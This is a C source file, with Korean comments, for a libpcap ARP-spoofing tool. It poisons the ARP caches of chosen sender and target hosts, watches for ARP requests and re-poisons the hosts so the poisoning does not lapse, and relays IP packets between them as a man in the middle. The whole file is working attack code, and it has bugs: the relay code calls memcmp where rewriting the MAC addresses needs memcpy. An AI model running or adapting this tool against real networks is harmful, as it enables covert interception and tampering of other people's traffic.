#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include "ethheader.h"
#include "arpframe.h"
#include "ipheader.h"
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h> 
#include <net/ethernet.h>



#pragma pack(push, 1)
typedef struct _EtherArpPacket
{
    ethheader ETHER; 
    arpframe ARP; 
}EtherArpPacket;

typedef struct _EtherIPPacket
{
    ethheader ETHER;
    ipheader IP;
}EtherIPPacket;

typedef struct _IPpair
{
    char* sender_ip_str;
    char* target_ip_str;
    uint32_t sender_ip;
    uint32_t target_ip;
}IPpair;
#pragma pack(pop)

void usage() 
{
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

void send_arp_request(pcap_t* handle, 
                        uint8_t* src_mac, uint8_t* dst_mac, 
                        uint8_t* sender_mac, uint32_t sender_ip, 
                        uint8_t* target_mac, uint32_t target_ip)
{
    EtherArpPacket packet;

    // Ethernet Header
    memcpy(packet.ETHER.ether_dstMAC, dst_mac, 6);   
    memcpy(packet.ETHER.ether_srcMAC, src_mac, 6);   
    packet.ETHER.ether_next_type = htons(0x0806);

    // ARP Payload
    packet.ARP.Hardware_Type = htons(1);
    packet.ARP.Protocol = htons(0x0800);
    packet.ARP.Hardware_Length = 6;
    packet.ARP.Protocol_Length = 4;
    packet.ARP.Operation = htons(1);                

    memcpy(packet.ARP.Sender_MAC, sender_mac, 6);      
    packet.ARP.Sender_Protocol_Addr = htonl(sender_ip); 
    memcpy(packet.ARP.Target_MAC, target_mac, 6);
    packet.ARP.Target_Protocol_Addr = htonl(target_ip);

    if (pcap_sendpacket(handle, (const unsigned char *)&packet, sizeof(packet)) != 0) 
    {
        fprintf(stderr, "[!] Error sending request packet: %s\n", pcap_geterr(handle));
    }
}                        

// ARP 포이즈닝 패킷(reply)를 조립하고 보내는 함수. 인자 전달시 주의.
void send_arp_poisoning(pcap_t* handle, 
                        uint8_t* src_mac, uint8_t* dst_mac, 
                        uint8_t* sender_mac, uint32_t sender_ip, 
                        uint8_t* target_mac, uint32_t target_ip) 
{
    EtherArpPacket packet;

    // Ethernet Header
    memcpy(packet.ETHER.ether_dstMAC, dst_mac, 6);   
    memcpy(packet.ETHER.ether_srcMAC, src_mac, 6);   
    packet.ETHER.ether_next_type = htons(0x0806);

    // ARP Payload
    packet.ARP.Hardware_Type = htons(1);
    packet.ARP.Protocol = htons(0x0800);
    packet.ARP.Hardware_Length = 6;
    packet.ARP.Protocol_Length = 4;
    packet.ARP.Operation = htons(2);                

    memcpy(packet.ARP.Sender_MAC, sender_mac, 6);      
    packet.ARP.Sender_Protocol_Addr = htonl(sender_ip); 
    memcpy(packet.ARP.Target_MAC, target_mac, 6);
    packet.ARP.Target_Protocol_Addr = htonl(target_ip);

    if (pcap_sendpacket(handle, (const unsigned char *)&packet, sizeof(packet)) != 0) 
    {
        fprintf(stderr, "[!] Error sending poisoning packet: %s\n", pcap_geterr(handle));
    }
}



int main(int argc, char* argv[])
{
    if (argc < 4)
    {
        usage();
        return -1;
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    char* dev = argv[1];

    int pair_count = (argc -2) / 2;
    IPpair pairs[pair_count];

    for (int i = 0; i < pair_count ; i++)
    {
        pairs[i].sender_ip_str = argv[2 + i*2];
        pairs[i].target_ip_str = argv[2 + i*2 + 1];

        pairs[i].sender_ip = ntohl(inet_addr(pairs[i].sender_ip_str)); 
        pairs[i].target_ip = ntohl(inet_addr(pairs[i].target_ip_str));
    }
    

    pcap_t* pcap = pcap_open_live(dev, 65535, 1, 1000, errbuf); //점보 프레임 고려
    
    if(pcap == NULL)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }


    //여기는 나의(공격자의) MAC 주소와 ip 주소 가져오는 부분
    unsigned char my_MAC[6];
    uint32_t my_ip;

    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;

    if (getifaddrs(&ifap) == 0) {
        for (ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr == NULL) continue;

            // 1. MAC 주소 가져오기 (리눅스 방식: AF_PACKET)
            if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_PACKET) {
                struct sockaddr_ll *sll = (struct sockaddr_ll *)ifa->ifa_addr;
                if (sll->sll_halen == 6) { // MAC 주소 길이는 6바이트
                    memcpy(my_MAC, sll->sll_addr, 6);
                }
            }

            // 2. IP 주소 가져오기 (AF_INET은 리눅스/macOS 공통)
            if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
                sa = (struct sockaddr_in *)ifa->ifa_addr;
                my_ip = ntohl(sa->sin_addr.s_addr);
            }
        }
        freeifaddrs(ifap);
    } else {
        perror("getifaddrs error");
        return -1;
    }    


    //여기서부터 pair 1쌍씩에 대해 반복문 수행
    unsigned char BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char UNKNOWN_MAC[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    uint16_t ARP_TYPE = 0x0806;
    uint16_t IP_TYPE = 0x0800;

    for (int i = 0; i < pair_count ; i++)
    {
         //우선 sender1의 맥 주소를 알아내기 위해 sender와 arp request&reply 주고받기
        //target1의 맥 주소를 알아내기 위해 arp request 보내는 코드 추가
        
        //sender1 MAC 주소 얻기 위해 arp request 보내기
        send_arp_request(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].sender_ip);
        printf("sent arp request packet to sender\n");
        
        //target1 MAC 주소 얻기 위해 arp request 보내기
        send_arp_request(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].target_ip);
        printf("sent arp request packet to target\n");

        
        //여기서부터 arp reply
        //target mac 저장하는 코드 추가
        
        unsigned char sender_MAC[6];
        unsigned char target_MAC[6];
        unsigned int check_sendermac = 0;
        unsigned int check_targetmac = 0;
		while(1)
        {
            if((check_sendermac == 1) && (check_targetmac == 1)) 
            {
                printf("sendermac and targetmac ready \n");
                break;
            }

            struct pcap_pkthdr* header;
            const unsigned char* packet;
            

            int res = pcap_next_ex(pcap, &header, &packet); //pcap_next_ex 더 공부해보기
            if(res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
            {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            
            EtherArpPacket* arpreply_packet = (EtherArpPacket*) packet;

            

            if(memcmp(arpreply_packet->ETHER.ether_dstMAC,my_MAC,6) != 0) continue; //Ethernet 수준에서 내(공격자) MAC주소로 온게 맞으면
            if(ntohs(arpreply_packet->ETHER.ether_next_type) != 0x0806) continue; //ARP 패킷만 통과시키기
            if(ntohs(arpreply_packet->ARP.Operation) != 0x0002) continue; //ARP 수준에서 Reply가 맞아야하고
            
            if(ntohl(arpreply_packet->ARP.Sender_Protocol_Addr) == pairs[i].sender_ip)
            {
                if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue; //ARP 수준에서 arp payload에 담긴 target MAC주소가 내 MAC 주소가 맞다면 통과시키기
                memcpy(sender_MAC,arpreply_packet->ARP.Sender_MAC,6);
                check_sendermac = 1;
                continue;
            } else if(ntohl(arpreply_packet->ARP.Sender_Protocol_Addr) == pairs[i].target_ip)
                {
                    if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue;
                    memcpy(target_MAC, arpreply_packet->ARP.Sender_MAC,6);
                    check_targetmac = 1;
                    continue;
                }
            

        }


        //여기서부터 arp spoofing 패킷 만들기

        //sender1한테 한번 보내놓기
        send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
        printf("Sent first arp poisoning packet to sender \n");
        //target1한테 한번 보내놓기
        send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip); 
        printf("Sent first arp poisoning packet to target \n");
        
        //여기서부터 arp poisoning 풀린걸 감지하면 re-infection해주는 부분 + relay 까지
        unsigned char BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        uint16_t ARP_TYPE = 0x0806;
        uint16_t IP_TYPE = 0x0800;
        uint8_t relay_buf[10000];

        while(1)
        {
            struct pcap_pkthdr* header;
            const unsigned char* packet;
            

            int res = pcap_next_ex(pcap, &header, &packet);
            if(res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
            {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }

            EtherArpPacket* arp_detect_packet = (EtherArpPacket*) packet;
            //////////////////////////////////////////////////////
            //sender 관리

            //1. sender1의 table이 만료되서 다시 target1 ip 맥주소를 얻기 위해
            //arp request를 broadcats하는 경우
            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,sender_MAC,6) == 0 &&
                memcmp(arp_detect_packet->ETHER.ether_dstMAC,BROADCAST_MAC,6) == 0 &&
                ntohs(arp_detect_packet->ETHER.ether_next_type) == ARP_TYPE &&
                arp_detect_packet->ARP.Target_Protocol_Addr == htonl(pairs[i].target_ip)&&
                arp_detect_packet->ARP.Operation == htons(0x01))
            {
                send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
                printf("Sent adaptive arp poisoning packet to sender : 1 \n");
                continue;
            }

            //2. sender1의 table이 만료되기 전에 target1 맥주소를 유지시키기 위해
            //arp request를 unicast하는 경우(단, 아직은 감염되어있는 상태)
            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,sender_MAC,6) == 0 &&
                memcmp(arp_detect_packet->ETHER.ether_dstMAC,my_MAC,6) == 0 && //unicast니까
                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
                arp_detect_packet->ARP.Target_Protocol_Addr == htonl(pairs[i].target_ip)&&
                arp_detect_packet->ARP.Operation == htons(0x01))
            {
                send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
                printf("Sent adaptive arp poisoning packet to sender : 2 \n");
                continue;
            }

            //3,4,5. target1이 arp request를 broadcast하는 경우(sender1의 맥주소를 알아내기 
            //위해서든 다른 놈의 맥주소를 알아내기 위해서든 관계 x)
            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,target_MAC,6) == 0 &&
                memcmp(arp_detect_packet->ETHER.ether_dstMAC, BROADCAST_MAC, 6) == 0  &&
                ntohs(arp_detect_packet->ETHER.ether_next_type) == ARP_TYPE &&
                memcmp(arp_detect_packet->ARP.Sender_MAC,target_MAC,6) == 0 &&
                ntohl(arp_detect_packet->ARP.Sender_Protocol_Addr) == pairs[i].target_ip)
            {
                send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
                printf("Sent adaptive arp poisoning packet to sender : 3,4,5 \n");
                continue;
            }
           
            //6. target1이 arp table 엔트리 유지를 위해 sender1에게 unicast해버리면? -> 둘 다 감염시키자
           
           
            //////////////////////////////////////////////////////////////////////////
            //target 관리

            //1. target1의 table이 만료되서 다시 sender1 ip 맥주소를 얻기 위해
            //arp request를 broadcats하는 경우
            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,target_MAC,6) == 0 &&
                memcmp(arp_detect_packet->ETHER.ether_dstMAC,BROADCAST_MAC,6) == 0 &&
                ntohs(arp_detect_packet->ETHER.ether_next_type) == ARP_TYPE &&
                ntohl(arp_detect_packet->ARP.Target_Protocol_Addr) == pairs[i].sender_ip&&
                ntohs(arp_detect_packet->ARP.Operation) == 0x01)
            {
                send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
                printf("Sent adaptive arp poisoning packet to target : 1 \n");
                continue;
            }

            //2. target1의 table이 만료되기 전에 sender1 맥주소를 유지시키기 위해
            //arp request를 unicast하는 경우(단, 아직은 감염되어있는 상태)
            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,target_MAC,6) == 0 &&
                memcmp(arp_detect_packet->ETHER.ether_dstMAC,my_MAC,6) == 0 &&
                ntohs(arp_detect_packet->ETHER.ether_next_type) == ARP_TYPE &&
                ntohl(arp_detect_packet->ARP.Target_Protocol_Addr) == pairs[i].sender_ip&&
                ntohs(arp_detect_packet->ARP.Operation) == 0x01)
            {
                send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
                printf("Sent adaptive arp poisoning packet to target : 2 \n");
                continue;
            }

            //3,4,5. sender1이 arp request를 broadcast하는 경우(target1의 맥주소를 알아내기 
            //위해서든 다른 놈의 맥주소를 알아내기 위해서든 관계 x)
            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,sender_MAC,6) == 0 &&
                memcmp(arp_detect_packet->ETHER.ether_dstMAC, BROADCAST_MAC, 6) == 0 &&
                ntohs(arp_detect_packet->ETHER.ether_next_type) == ARP_TYPE &&
                memcmp(arp_detect_packet->ARP.Sender_MAC,sender_MAC,6) == 0 &&
                ntohl(arp_detect_packet->ARP.Sender_Protocol_Addr) == pairs[i].sender_ip)
            {
                send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
                printf("Sent adaptive arp poisoning packet to target : 3,4,5 \n");
                continue;
            }

            //여기서부터 Relay
            EtherIPPacket* relay_packet = (EtherIPPacket*) packet;

            
            if(ntohs(relay_packet->ETHER.ether_next_type) == IP_TYPE)
            {   
                //1. sender1 -> 나 -> target1 패킷을 relay 해주는 조건
                if(memcmp(relay_packet->ETHER.ether_srcMAC, sender_MAC, 6) == 0 &&
                    memcmp(relay_packet->ETHER.ether_dstMAC, my_MAC, 6) == 0 &&
                    ntohl(relay_packet->IP.DstIP) != my_ip)
                    {
                        //ether 헤더에서 src_MAC을 my_MAC으로, dst_MAC을 target1 MAC으로 갈아끼워서 보내기.
                        memcpy(relay_buf, packet, header->caplen);
                        relay_packet = (EtherIPPacket*) relay_buf;
                        memcmp(relay_packet->ETHER.ether_srcMAC, my_MAC, 6);
                        memcmp(relay_packet->ETHER.ether_dstMAC, target_MAC, 6);

                        pcap_sendpacket(pcap, relay_buf, header->caplen);
                        printf("Sent relay packet: sender -> me -> target \n");
                    }
                
                    
                //2. target1 -> 나 -> sender1 패킷을 relay 해주는 조건
                else if(memcmp(relay_packet->ETHER.ether_srcMAC, target_MAC, 6) == 0 &&
                    memcmp(relay_packet->ETHER.ether_dstMAC, my_MAC, 6) == 0 &&
                    ntohl(relay_packet->IP.DstIP) != my_ip)
                    {
                        //ether 헤더에서 src_MAC을 my_MAC으로, dst_MAC을 sender1 MAC으로 갈아끼워서 보내기.
                        memcpy(relay_buf, packet, header->caplen);
                        relay_packet = (EtherIPPacket*) relay_buf;
                        memcmp(relay_packet->ETHER.ether_srcMAC, my_MAC, 6);
                        memcmp(relay_packet->ETHER.ether_dstMAC, sender_MAC, 6);

                        pcap_sendpacket(pcap, relay_buf, header->caplen);
                        printf("Sent relay packet: target -> me -> sender \n");
                        
                    }
            }

            


        }



    }

        
    return 0;
}
